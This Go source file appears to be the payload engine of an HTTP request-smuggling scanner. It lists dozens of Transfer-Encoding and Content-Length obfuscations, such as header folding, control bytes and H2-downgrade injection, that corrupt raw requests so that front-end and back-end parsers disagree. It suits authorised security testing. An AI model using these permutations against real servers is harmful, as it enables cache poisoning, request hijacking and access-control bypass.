// Package permute implements every Transfer-Encoding and Content-Length
// obfuscation technique catalogued in DesyncBox.java.
// Each technique mutates a raw HTTP/1.1 request byte-slice in a specific way
// designed to exploit disagreements between front-end and back-end parsers.
package permute

import (
	"bytes"
	"fmt"
	"strings"
)

// Technique describes a single obfuscation permutation.
type Technique struct {
	Name        string
	Description string
	// Apply mutates the raw request. Returns nil if the technique
	// has no effect on this request (caller should skip it).
	Apply func(req []byte) []byte
}

// AllTEPermutations returns every Transfer-Encoding obfuscation technique.
// These target front-end/back-end disagreement on which TE header is canonical.
func AllTEPermutations() []Technique {
	techs := []Technique{
		{
			Name:        "vanilla",
			Description: "Standard Transfer-Encoding: chunked — baseline",
			Apply:       func(req []byte) []byte { return addTE(req, "chunked") },
		},
		// ── Name mutations ───────────────────────────────────────────────
		{
			Name:        "underjoin1",
			Description: "Transfer_Encoding: chunked (hyphen → underscore)",
			Apply:       func(req []byte) []byte { return replaceHeader(req, "Transfer-Encoding", "Transfer_Encoding") },
		},
		{
			Name:        "spacejoin1",
			Description: "Transfer Encoding: chunked (hyphen → space)",
			Apply:       func(req []byte) []byte { return replaceHeader(req, "Transfer-Encoding", "Transfer Encoding") },
		},
		{
			Name:        "space1",
			Description: "Transfer-Encoding : chunked (space before colon)",
			Apply:       func(req []byte) []byte { return replaceHeaderColon(req, "Transfer-Encoding", "Transfer-Encoding :") },
		},
		{
			Name:        "nospace1",
			Description: "Transfer-Encoding:chunked (no space after colon)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding:chunked") },
		},
		{
			Name:        "UPPERCASE",
			Description: "TRANSFER-ENCODING: chunked",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "TRANSFER-ENCODING: chunked") },
		},
		{
			Name:        "h1case",
			Description: "TRANSFER-ENCODING: chunked (full upper)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "TRANSFER-ENCODING: chunked") },
		},
		{
			Name:        "multiCase",
			Description: "tRANSFER-ENCODING: chunked",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "tRANSFER-ENCODING: chunked") },
		},
		// ── Prefix injection (prepend junk header before TE) ─────────────
		{
			Name:        "nameprefix1",
			Description: "Foo: bar\\r\\n Transfer-Encoding: chunked (space fold)",
			Apply: func(req []byte) []byte {
				return injectBeforeHeader(req, "Transfer-Encoding", "Foo: bar\r\n ")
			},
		},
		{
			Name:        "nameprefix2",
			Description: "Foo: bar\\r\\n\\tTransfer-Encoding: chunked (tab fold)",
			Apply: func(req []byte) []byte {
				return injectBeforeHeader(req, "Transfer-Encoding", "Foo: bar\r\n\t")
			},
		},
		{
			Name:        "badsetupCR",
			Description: "Foo: bar\\rTransfer-Encoding: chunked (bare CR before)",
			Apply: func(req []byte) []byte {
				return injectBeforeHeader(req, "Transfer-Encoding", "Foo: bar\r")
			},
		},
		{
			Name:        "badsetupLF",
			Description: "Foo: bar\\nTransfer-Encoding: chunked (bare LF before)",
			Apply: func(req []byte) []byte {
				return injectBeforeHeader(req, "Transfer-Encoding", "Foo: bar\n")
			},
		},
		{
			Name:        "0dwrap",
			Description: "Foo: bar\\r\\n\\rTransfer-Encoding: chunked",
			Apply: func(req []byte) []byte {
				return injectBeforeHeader(req, "Transfer-Encoding", "Foo: bar\r\n\r")
			},
		},
		// ── Value prefix / suffix ─────────────────────────────────────────
		{
			Name:        "valueprefix1",
			Description: "Transfer-Encoding:  chunked (extra leading space in value)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding:  chunked") },
		},
		{
			Name:        "0dsuffix",
			Description: "Transfer-Encoding: chunked\\r (CR suffix on value)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding: chunked\r") },
		},
		{
			Name:        "tabsuffix",
			Description: "Transfer-Encoding: chunked\\t (tab suffix)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding: chunked\t") },
		},
		// ── Line-wrapping / folding ───────────────────────────────────────
		{
			Name:        "linewrapped1",
			Description: "Transfer-Encoding:\\n chunked (LF-fold obsolete form)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding:\n chunked") },
		},
		{
			Name:        "doublewrapped",
			Description: "Transfer-Encoding:\\r\\n \\r\\n chunked (double fold)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding:\r\n \r\n chunked") },
		},
		{
			Name:        "gareth1",
			Description: "Transfer-Encoding\\n : chunked",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding\n : chunked") },
		},
		{
			Name:        "vertwrap",
			Description: "Transfer-Encoding: chunked\\n\\v (vertical-tab wrap)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding: chunked\n\v") },
		},
		{
			Name:        "tabwrap",
			Description: "Transfer-Encoding: chunked\\r\\n\\t (tab continuation)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding: chunked\r\n\t") },
		},
		{
			Name:        "badwrap",
			Description: "X-Blah-Ignore: [first line] Transfer-Encoding: chunked",
			Apply: func(req []byte) []byte {
				r := replaceFirstBytes(req, "Transfer-Encoding: chunked", "X-Blah-Ignore: x")
				// inject TE after first \r\n
				return replaceFirstBytes(r, "\r\n", "\r\n Transfer-Encoding: chunked\r\n")
			},
		},
		{
			Name:        "bodysplit",
			Description: "X: y\\nFoo: bar\\n\\nTransfer-Encoding: chunked",
			Apply: func(req []byte) []byte {
				r := replaceFirstBytes(req, "Transfer-Encoding: chunked", "X: y")
				return replaceFirstBytes(r, "X: y\r\n", "X: y\r\nFoo: barn\n\nTransfer-Encoding: chunked\r\n")
			},
		},
		// ── Connection-header tricks ──────────────────────────────────────
		{
			Name:        "connection",
			Description: "Connection: Transfer-Encoding\\r\\nTransfer-Encoding: chunked",
			Apply: func(req []byte) []byte {
				return injectBeforeHeader(req, "Transfer-Encoding", "Connection: Transfer-Encoding\r\n")
			},
		},
		// ── Value obfuscation ─────────────────────────────────────────────
		{
			Name:        "spjunk",
			Description: "Transfer-Encoding x: chunked (Amit Klein junk-word)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding x: chunked") },
		},
		{
			Name:        "backslash",
			Description: "Transfer\\Encoding: chunked (backslash instead of hyphen)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer\\Encoding: chunked") },
		},
		{
			Name:        "commaCow",
			Description: "Transfer-Encoding: chunked, identity",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding: chunked, identity") },
		},
		{
			Name:        "cowComma",
			Description: "Transfer-Encoding: identity, chunked",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding: identity, chunked") },
		},
		{
			Name:        "contentEnc",
			Description: "Content-Encoding: chunked (wrong header name)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Content-Encoding: chunked") },
		},
		{
			Name:        "quoted",
			Description: `Transfer-Encoding: "chunked"`,
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", `Transfer-Encoding: "chunked"`) },
		},
		{
			Name:        "aposed",
			Description: "Transfer-Encoding: 'chunked'",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding: 'chunked'") },
		},
		{
			Name:        "dualchunk",
			Description: "Transfer-encoding: identity + Transfer-Encoding: chunked",
			Apply: func(req []byte) []byte {
				return addHeaderBefore(req, "Transfer-Encoding", "Transfer-encoding: identity")
			},
		},
		{
			Name:        "revdualchunk",
			Description: "Transfer-Encoding: identity\\r\\nTransfer-Encoding: chunked",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked") },
		},
		{
			Name:        "lazygrep",
			Description: "Transfer-Encoding: chunk (truncated value)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding: chunk") },
		},
		{
			Name:        "nested",
			Description: "Transfer-Encoding: identity, chunked, identity",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding: identity, chunked, identity") },
		},
		{
			Name:        "encode",
			Description: "Transfer-%45ncoding: chunked (URL-encoded E)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-%45ncoding: chunked") },
		},
		{
			Name:        "qencode",
			Description: "Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?= (MIME-encoded)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?=") },
		},
		{
			Name:        "qencodeutf",
			Description: "Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?= (UTF-8 MIME)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?=") },
		},
		// ── Unicode / high-byte tricks ────────────────────────────────────
		{
			Name:        "nel",
			Description: "Transfer-Encoding\\u0085: chunked (NEL before colon)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding:", "Transfer-Encoding\u0085:") },
		},
		{
			Name:        "nbsp",
			Description: "Transfer-Encoding\\u00A0: chunked (NBSP before colon)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding:", "Transfer-Encoding\u00A0:") },
		},
		{
			Name:        "shy2",
			Description: "Transfer-Encoding\\u00AD: chunked (soft-hyphen before colon)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding:", "Transfer-Encoding\u00AD:") },
		},
		{
			Name:        "shy",
			Description: "Transfer\\u00ADEncoding: chunked (soft-hyphen in name)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding:", "Transfer\u00ADEncoding:") },
		},
		{
			Name:        "spaceFF",
			Description: "Transfer-Encoding\\xFF: chunked (0xFF byte after name)",
			Apply:       func(req []byte) []byte { return replaceByteLiteral(req, "Transfer-Encoding: ", []byte("Transfer-Encoding\xff ")) },
		},
		{
			Name:        "unispace",
			Description: "Transfer-Encoding\\xa0: chunked (0xA0 space byte)",
			Apply:       func(req []byte) []byte { return replaceByteLiteral(req, "Transfer-Encoding: ", []byte("Transfer-Encoding\xa0 ")) },
		},
		{
			Name:        "accentTE",
			Description: "Transf\\x82r-Encoding: chunked (accent byte in name)",
			Apply: func(req []byte) []byte {
				old := []byte("Transfer-Encoding: ")
				rep := append([]byte("Transf\x82r-Encoding: "), []byte{}...)
				return bytes.Replace(req, old, rep, 1)
			},
		},
		{
			Name:        "accentCH",
			Description: "Transfer-Encoding: ch\\x96unked (accent in value)",
			Apply: func(req []byte) []byte {
				old := []byte("Transfer-Encoding: chu")
				rep := []byte("Transfer-Encoding: ch\x96")
				return bytes.Replace(req, old, rep, 1)
			},
		},
		// ── H2→H1 downgrade specific ──────────────────────────────────────
		{
			Name:        "http2hide",
			Description: "Foo: b^~Transfer-Encoding: chunked^~x: x (H2 header injection via newline in value)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Foo: b\r\nTransfer-Encoding: chunked\r\nx: x") },
		},
		{
			Name:        "h2colon",
			Description: "Transfer-Encoding`chunked : chunked",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding`chunked : chunked") },
		},
		{
			Name:        "h2name",
			Description: "Transfer-Encoding`chunked\\r\\nxz: x",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding`chunked\r\nxz: x") },
		},
		{
			Name:        "h2space",
			Description: "Transfer-Encoding chunked : chunked",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Transfer-Encoding chunked : chunked") },
		},
		{
			Name:        "h2prefix",
			Description: ":transfer-encoding: chunked (pseudo-header prefix)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", ":transfer-encoding: chunked") },
		},
		{
			Name:        "http2case",
			Description: "lowercase entire request + transfer-Encoding: chunked",
			Apply: func(req []byte) []byte {
				lower := bytes.ToLower(req)
				return replaceFirstBytes(lower, "transfer-encoding: chunked", "x-reject: 1\r\ntransfer-Encoding: chunked")
			},
		},
		// ── Method/protocol tricks ────────────────────────────────────────
		{
			Name:        "http1.0",
			Description: "Downgrade to HTTP/1.0",
			Apply: func(req []byte) []byte {
				r := bytes.Replace(req, []byte("HTTP/1.1"), []byte("HTTP/1.0"), 1)
				return bytes.Replace(r, []byte("HTTP/2"), []byte("HTTP/1.0"), 1)
			},
		},
		{
			Name:        "get",
			Description: "Switch method to GET",
			Apply:       func(req []byte) []byte { return setMethod(req, "GET") },
		},
		{
			Name:        "options",
			Description: "Switch method to OPTIONS",
			Apply:       func(req []byte) []byte { return setMethod(req, "OPTIONS") },
		},
		{
			Name:        "head",
			Description: "Switch method to HEAD",
			Apply:       func(req []byte) []byte { return setMethod(req, "HEAD") },
		},
		{
			Name:        "range",
			Description: "Add Range: bytes=0-0 header",
			Apply:       func(req []byte) []byte { return addOrReplaceHeader(req, "Range", "bytes=0-0") },
		},
		{
			Name:        "removed",
			Description: "Remove Transfer-Encoding entirely",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding: chunked", "Nothing-interesting: 1") },
		},
		// ── 0dspam ───────────────────────────────────────────────────────
		{
			Name:        "0dspam",
			Description: "Tra\\rnsfer-Encoding: chunked (CR in name)",
			Apply:       func(req []byte) []byte { return replaceFirstBytes(req, "Transfer-Encoding:", "Tra\rnsfer-Encoding:") },
		},
	}

	// spacefix1:<char> — replace space after colon with special char
	for _, ch := range specialChars() {
		ch := ch
		techs = append(techs, Technique{
			Name:        fmt.Sprintf("spacefix1:%d", ch),
			Description: fmt.Sprintf("Transfer-Encoding:%c chunked (char 0x%02x replaces space)", ch, ch),
			Apply: func(req []byte) []byte {
				return replaceFirstBytes(req, "Transfer-Encoding: ", fmt.Sprintf("Transfer-Encoding:%c", ch))
			},
		})
	}

	// prefix1:<char> — append special char after header value
	for _, ch := range specialChars() {
		ch := ch
		techs = append(techs, Technique{
			Name:        fmt.Sprintf("prefix1:%d", ch),
			Description: fmt.Sprintf("Transfer-Encoding: chunked%c (char 0x%02x suffix on value)", ch, ch),
			Apply: func(req []byte) []byte {
				return replaceFirstBytes(req, "Transfer-Encoding: chunked", fmt.Sprintf("Transfer-Encoding: chunked%c", ch))
			},
		})
	}

	// suffix1:<char> — append special char after value+\r\n
	for _, ch := range specialChars() {
		ch := ch
		techs = append(techs, Technique{
			Name:        fmt.Sprintf("suffix1:%d", ch),
			Description: fmt.Sprintf("Transfer-Encoding: chunked (char 0x%02x appended)", ch, ch),
			Apply: func(req []byte) []byte {
				old := []byte("Transfer-Encoding: chunked")
				rep := []byte(fmt.Sprintf("Transfer-Encoding: chunked%c", ch))
				return bytes.Replace(req, old, rep, 1)
			},
		})
	}

	// namesuffix1:<char> — append special char before colon in header name
	for _, ch := range specialChars() {
		ch := ch
		techs = append(techs, Technique{
			Name:        fmt.Sprintf("namesuffix1:%d", ch),
			Description: fmt.Sprintf("Transfer-Encoding%c: chunked (char 0x%02x before colon)", ch, ch),
			Apply: func(req []byte) []byte {
				return replaceFirstBytes(req, "Transfer-Encoding:", fmt.Sprintf("Transfer-Encoding%c:", ch))
			},
		})
	}

	return techs
}

// AllCLPermutations returns Content-Length obfuscation techniques.
func AllCLPermutations() []Technique {
	return []Technique{
		{
			Name:        "CL-plus",
			Description: "Content-Length: +N (plus prefix)",
			Apply: func(req []byte) []byte { return replaceFirstBytes(req, "Content-Length: ", "Content-Length: +") },
		},
		{
			Name:        "CL-minus",
			Description: "Content-Length: -N (minus prefix)",
			Apply: func(req []byte) []byte { return replaceFirstBytes(req, "Content-Length: ", "Content-Length: -") },
		},
		{
			Name:        "CL-pad",
			Description: "Content-Length: 0N (zero padded)",
			Apply: func(req []byte) []byte { return replaceFirstBytes(req, "Content-Length: ", "Content-Length: 0") },
		},
		{
			Name:        "CL-bigpad",
			Description: "Content-Length: 00000000000N (many zero pads)",
			Apply: func(req []byte) []byte { return replaceFirstBytes(req, "Content-Length: ", "Content-Length: 00000000000") },
		},
		{
			Name:        "CL-spacepad",
			Description: "Content-Length: 0 N (space between prefix-zero and value)",
			Apply: func(req []byte) []byte { return replaceFirstBytes(req, "Content-Length: ", "Content-Length: 0 ") },
		},
		{
			Name:        "CL-e",
			Description: "Content-Length: Ne0 (scientific notation suffix)",
			Apply: func(req []byte) []byte {
				return appendToHeaderValue(req, "Content-Length", "e0")
			},
		},
		{
			Name:        "CL-dec",
			Description: "Content-Length: N.0 (decimal point)",
			Apply: func(req []byte) []byte {
				return appendToHeaderValue(req, "Content-Length", ".0")
			},
		},
		{
			Name:        "CL-commaprefix",
			Description: "Content-Length: 0, N",
			Apply: func(req []byte) []byte { return replaceFirstBytes(req, "Content-Length: ", "Content-Length: 0, ") },
		},
		{
			Name:        "CL-commasuffix",
			Description: "Content-Length: N, 0",
			Apply: func(req []byte) []byte {
				return appendToHeaderValue(req, "Content-Length", ", 0")
			},
		},
		{
			Name:        "CL-expect",
			Description: "Add Expect: 100-continue",
			Apply:       func(req []byte) []byte { return addOrReplaceHeader(req, "Expect", "100-continue") },
		},
		{
			Name:        "CL-expect-obfs",
			Description: "Add Expect: x 100-continue",
			Apply:       func(req []byte) []byte { return addOrReplaceHeader(req, "Expect", "x 100-continue") },
		},
		{
			Name:        "CL-error",
			Description: "X-Invalid Y: \\r\\nContent-Length: N (injected invalid header before CL)",
			Apply: func(req []byte) []byte {
				return replaceFirstBytes(req, "Content-Length: ", "X-Invalid Y: \r\nContent-Length: ")
			},
		},
	}
}

// specialChars returns the subset of bytes used for boundary-testing.
func specialChars() []byte {
	return []byte{0x01, 0x04, 0x08, 0x09, 0x0b, 0x0c, 0x0d, 0x1f, 0x7f}
}

// ─── Low-level request mutation helpers ──────────────────────────────────────

// AddTE adds Transfer-Encoding: chunked if not present, returns the modified request.
func AddTE(req []byte) []byte { return addTE(req, "chunked") }

func addTE(req []byte, value string) []byte {
	if bytes.Contains(req, []byte("Transfer-Encoding")) {
		return req
	}
	return addOrReplaceHeader(req, "Transfer-Encoding", value)
}

func replaceFirstBytes(req []byte, old, new string) []byte {
	return bytes.Replace(req, []byte(old), []byte(new), 1)
}

func replaceByteLiteral(req []byte, old string, new []byte) []byte {
	return bytes.Replace(req, []byte(old), new, 1)
}

func replaceHeader(req []byte, oldName, newName string) []byte {
	return bytes.Replace(req, []byte(oldName+": "), []byte(newName+": "), 1)
}

func replaceHeaderColon(req []byte, oldName, newHeader string) []byte {
	return bytes.Replace(req, []byte(oldName+": "), []byte(newHeader+" "), 1)
}

func injectBeforeHeader(req []byte, header, prefix string) []byte {
	target := []byte(header + ": ")
	idx := bytes.Index(req, target)
	if idx == -1 {
		return req
	}
	var buf bytes.Buffer
	buf.Write(req[:idx])
	buf.WriteString(prefix)
	buf.Write(req[idx:])
	return buf.Bytes()
}

func addHeaderBefore(req []byte, beforeHeader, newHeader string) []byte {
	target := []byte(beforeHeader + ": ")
	idx := bytes.Index(req, target)
	if idx == -1 {
		return req
	}
	var buf bytes.Buffer
	buf.Write(req[:idx])
	buf.WriteString(newHeader + "\r\n")
	buf.Write(req[idx:])
	return buf.Bytes()
}

// AddOrReplaceHeader adds or replaces a header in a raw HTTP/1.1 request.
func AddOrReplaceHeader(req []byte, name, value string) []byte {
	return addOrReplaceHeader(req, name, value)
}

func addOrReplaceHeader(req []byte, name, value string) []byte {
	target := []byte(name + ": ")
	if idx := bytes.Index(req, target); idx != -1 {
		// find end of this header line
		end := bytes.Index(req[idx:], []byte("\r\n"))
		if end == -1 {
			return req
		}
		end += idx + 2
		var buf bytes.Buffer
		buf.Write(req[:idx])
		buf.WriteString(name + ": " + value + "\r\n")
		buf.Write(req[end:])
		return buf.Bytes()
	}
	// inject before the blank line separating headers from body
	sep := bytes.Index(req, []byte("\r\n\r\n"))
	if sep == -1 {
		return req
	}
	var buf bytes.Buffer
	buf.Write(req[:sep])
	buf.WriteString("\r\n" + name + ": " + value)
	buf.Write(req[sep:])
	return buf.Bytes()
}

func appendToHeaderValue(req []byte, name, suffix string) []byte {
	target := []byte(name + ": ")
	idx := bytes.Index(req, target)
	if idx == -1 {
		return req
	}
	end := bytes.Index(req[idx:], []byte("\r\n"))
	if end == -1 {
		return req
	}
	end += idx
	var buf bytes.Buffer
	buf.Write(req[:end])
	buf.WriteString(suffix)
	buf.Write(req[end:])
	return buf.Bytes()
}

// SetMethod replaces the HTTP method on the request line.
func SetMethod(req []byte, method string) []byte { return setMethod(req, method) }

func setMethod(req []byte, method string) []byte {
	// find first space
	sp := bytes.IndexByte(req, ' ')
	if sp == -1 {
		return req
	}
	var buf bytes.Buffer
	buf.WriteString(method)
	buf.Write(req[sp:])
	return buf.Bytes()
}

// SetBody replaces the body (everything after \r\n\r\n) and updates Content-Length.
func SetBody(req []byte, body string) []byte {
	sep := bytes.Index(req, []byte("\r\n\r\n"))
	if sep == -1 {
		return req
	}
	r := req[:sep+4]
	r = append(r, []byte(body)...)
	return addOrReplaceHeader(r, "Content-Length", fmt.Sprintf("%d", len(body)))
}

// GetBody returns the body portion of a raw request.
func GetBody(req []byte) string {
	sep := bytes.Index(req, []byte("\r\n\r\n"))
	if sep == -1 {
		return ""
	}
	return string(req[sep+4:])
}

// GetHeader returns the value of a named header or empty string.
func GetHeader(req []byte, name string) string {
	target := []byte(name + ": ")
	idx := bytes.Index(req, target)
	if idx == -1 {
		return ""
	}
	start := idx + len(target)
	end := bytes.Index(req[start:], []byte("\r\n"))
	if end == -1 {
		return string(req[start:])
	}
	return string(req[start : start+end])
}

// GetPath extracts the path from the request line.
func GetPath(req []byte) string {
	line := req
	if nl := bytes.IndexByte(req, '\n'); nl != -1 {
		line = req[:nl]
	}
	parts := strings.Fields(string(line))
	if len(parts) >= 2 {
		return parts[1]
	}
	return "/"
}

// BuildChunkedBody returns the chunked encoding of a body string,
// ending with a terminal 0\r\n\r\n chunk.
func BuildChunkedBody(body string, offset int) string {
	if body == "" {
		body = "x=y"
	}
	size := len(body) + offset
	if size < 0 {
		size = 0
	}
	return fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", size, body)
}

// BuildMalformedChunkedBody builds a chunked body that ends with a
// partial chunk — used to test whether the back-end waits for more data.
func BuildMalformedChunkedBody(body string) string {
	if body == "" {
		body = "x=y"
	}
	return fmt.Sprintf("%x\r\n%s\r\n1\r\nZ\r\nQ\r\n\r\n", len(body), body)
}

// ApplyTEPermutation applies a named TE technique to a request.
// Returns nil if the technique is not found or has no effect.
func ApplyTEPermutation(req []byte, name string) []byte {
	for _, t := range AllTEPermutations() {
		if t.Name == name {
			result := t.Apply(req)
			if bytes.Equal(result, req) && name != "vanilla" {
				return nil
			}
			return result
		}
	}
	return nil
}
